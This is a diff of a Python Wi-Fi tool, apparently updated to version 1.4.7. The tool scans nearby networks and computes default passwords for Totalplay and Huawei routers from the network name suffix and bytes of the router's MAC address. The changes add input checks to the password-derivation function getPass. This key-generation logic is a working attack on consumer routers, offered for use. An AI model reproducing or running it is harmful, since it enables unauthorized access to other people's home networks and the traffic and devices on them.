@@ -19,7 +19,7 @@ import os
 
 
 
-Version = "v1.4.6"
+Version = "v1.4.7"
 
 
 
@@ -317,9 +317,6 @@ def ObtenerRedes():
 			
 			if Cont == 1:
 				
-				if x == "Totalplay-003D": x = "TOTALPLAY"
-				elif x == "CBGB": x = "Huawei-HG2568-ABCD"
-				
 				ESSID.append(x)
 				Tam += 1
 				
@@ -551,12 +548,14 @@ def getPass(Nombre, MAC):
 	
 	Nomb1, Nomb2 = "", ""
 	Pass = ""
+	xD = ""
 	
 	if "Totalplay" in Nombre:	# Para redes Totalplay de 4 Caracteres: Totalplay-XXXX 
 		
-		xD = Nombre.split("-")
+		try: xD = Nombre.split("-")[1]
+		except: Pass = "UNKNOWN"
 		
-		if len(xD[1]) == 4:
+		if len(xD) == 4:
 			
 			Nombre = Nombre[-4:]
 			MAC = MAC.split(":")
@@ -565,16 +564,24 @@ def getPass(Nombre, MAC):
 		else: Pass = "UKNOWN"
 	
 	elif "Huawei" in Nombre:
-					
-		Nombre = Nombre[-4:]
-		MAC = MAC.split(":")
-		Pass = MAC[3] + MAC[4] + Nombre
+		
+		try: xD = Nombre.split("-")[2]
+		except: Pass = "UNKNOWN"
+		
+		if len(xD) == 4:
+			
+			Nombre = Nombre[-4:]
+			MAC = MAC.split(":")
+			Pass = MAC[3] + MAC[4] + Nombre
+			
+		else:  Pass = "UKNOWN"
 		
 	elif "TOTALPLAY" in Nombre:	# Para redes Totalplay de 6 Caracteres: TOTALPLAY_XXXXXX 
 		
-		xD = Nombre.split("_")
+		try: xD = Nombre.split("_")[1]
+		except: Pass = "UNKNOWN"
 		
-		if len(xD[1]) == 6:
+		if len(xD) == 6:
 			
 			Nombre = Nombre[-6:-2]
 			MAC = MAC.split(":")
